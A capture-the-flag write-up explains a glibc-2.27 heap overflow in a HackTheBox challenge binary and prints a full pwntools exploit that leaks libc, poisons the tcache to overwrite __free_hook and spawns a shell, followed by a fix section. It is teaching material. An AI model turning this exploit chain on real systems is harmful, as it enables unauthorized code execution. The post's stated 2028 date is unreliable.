---
layout: post
title: "Bon-nie-appetit"
date: 2028-02-21 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, glibc-2.27, tcache-poisoning, heap-overflow, free-hook]
description: "A glibc-2.27 heap-notes binary where the edit function reads strlen(chunk) instead of the allocation size — a heap overflow that forges a chunk header, feeds a tcache-poisoning chain, and overwrites __free_hook with system()."
---

## Overview

Bon-nie-appetit is a Medium pwn challenge: a menu-driven "orders" manager (make / show / edit / delete) built against glibc 2.27, with Full RELRO, a stack canary, NX, and PIE. It's a clean tour of classic heap exploitation — an [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) that becomes an arbitrary write, ending in `system("/bin/sh")`.

## The bugs

Three functions matter:

- **`edit_order`** reads `strlen(orders[i])` bytes into the chunk — the length is the length of the *current* contents, not the allocation size. Since `new_order` reads exactly `size` bytes, filling a chunk completely (no terminating NUL) makes a later `edit` compute a `strlen` that runs off the end of the chunk: a [heap buffer overflow](https://cwe.mitre.org/data/definitions/122.html) into the adjacent chunk's size field.
- **`show_order`** prints the chunk with `%s` — an information leak.
- **`delete_order`** frees the chunk *and* NULLs the slot, so there's no use-after-free; the overflow is the whole game.

glibc 2.27's tcache has no double-free key and no pointer mangling, so once you can forge a chunk and free it, poisoning a tcache freelist is trivial.

## Solution

**Phase 1 — libc leak via the unsorted bin.** Allocate a large chunk (`0x428`) and a small guard, free both; the large chunk lands in the unsorted bin with its `fd` pointing at `main_arena+0x60`. Re-allocate it, sending exactly one byte — sending zero bytes hangs on `read`, and one byte clobbers only the low byte of that pointer. `show` then `%s`-leaks the rest. The clobbered low byte is recoverable: the library base is page-aligned and `main_arena+0x60` is at libc offset `0x3ebca0`, whose low byte must be `0xa0`, so `libc.address = ((leak & ~0xff) | 0xa0) - 0x3ebca0`.

**Phase 2 — forge a chunk size via the overflow.** Allocate three `0x28` chunks filled to the brim, then `edit` the first with `'M'*0x28 + p8(0x81)` so the `strlen`-driven read overruns into the second chunk's size field, changing it to `0x81`.

**Phase 3 — poison `__free_hook`.** Free the resized chunk (now a `0x80` chunk) and its neighbour, then allocate a `0x78` chunk whose payload overwrites the tcache `fd` with `&__free_hook`. Two more allocations hand back `__free_hook`; write `system` there. Finally, free a chunk containing `/bin/sh` — `free()` calls `__free_hook`, which is now `system`, giving `system("/bin/sh")`.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
import sys
libc = ELF('./glibc/libc.so.6', checksec=False)
io = remote(*sys.argv[1].split(':')) if len(sys.argv) > 1 else process(['./bon-nie-appetit'])

def make(s, d):  io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'how many: ', str(s).encode()); io.sendafter(b'to order: ', d)
def show(i):     io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'Number of order: ', str(i).encode())
def edit(i, d):  io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'Number of order: ', str(i).encode()); io.sendafter(b'New order: ', d)
def delete(i):   io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'Number of order: ', str(i).encode())

# 1) unsorted-bin libc leak
make(0x428, b'A'); make(0x18, b'B'); delete(0); delete(1)
make(0x428, b'A'); show(0)
io.recvuntil(b'=> '); raw = io.recvuntil(b' \n', drop=True)
libc.address = ((u64(raw.ljust(8, b'\x00')) & ~0xff) | 0xa0) - 0x3ebca0

# 2) heap overflow forges chunk1 size = 0x81
delete(0)
make(0x28, b'X'*0x28); make(0x28, b'Y'*0x28); make(0x28, b'Z'*0x28)
edit(0, b'M'*0x28 + p8(0x81))

# 3) tcache poison __free_hook -> system, free "/bin/sh"
delete(1); delete(2)
make(0x78, b'D'*0x28 + p64(0x21) + p64(libc.sym['__free_hook']))
make(0x28, b'/bin/sh\x00'); make(0x28, p64(libc.sym['system'])); delete(2)
io.interactive()
```

Run it against the instance and read the flag from the shell:

```
HTB{...}
```

## Why it worked

Using `strlen` to size a `read` is the root mistake — the write length is attacker-influenced and unbounded by the allocation. From there, glibc 2.27's unprotected tcache turns one forged size field into an arbitrary allocation, and the still-present `__free_hook` turns an arbitrary write into code execution.

## Fix / defense

Track and use each buffer's real capacity — never derive a read length from `strlen` of prior contents. Beyond the bug: modern glibc (2.34+) removed `__malloc_hook`/`__free_hook` and added tcache pointer mangling (safe-linking) and double-free detection, which break each stage of this chain; building against a current libc is the strongest structural defense.
